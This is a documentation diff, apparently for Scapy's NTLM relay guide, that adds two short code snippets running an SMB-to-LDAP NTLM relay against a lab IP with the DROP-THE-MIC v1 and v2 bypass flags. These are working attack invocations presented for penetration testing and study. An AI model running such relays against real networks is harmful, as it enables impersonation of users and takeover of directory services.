@@ -104,6 +104,18 @@ _________________________________________________
 .. image:: ../graphics/ntlm/ntlmrelay_ldap.png
    :align: center
 
+Let's try using DROP-THE-MIC-v1 or DROP-THE-MIC-v2:
+
+.. code::
+
+    load_layer("ldap")
+    ntlm_relay(NTLM_SMB_Server, "192.168.122.156", NTLM_LDAP_Client, iface="virbr0", DROP_MIC_v1=True)
+
+.. code::
+
+    load_layer("ldap")
+    ntlm_relay(NTLM_SMB_Server, "192.168.122.156", NTLM_LDAP_Client, iface="virbr0", DROP_MIC_v2=True)
+
 SMB2 <-> LDAPS: relay SMB's NTLM to an LDAPS server
 ___________________________________________________
 
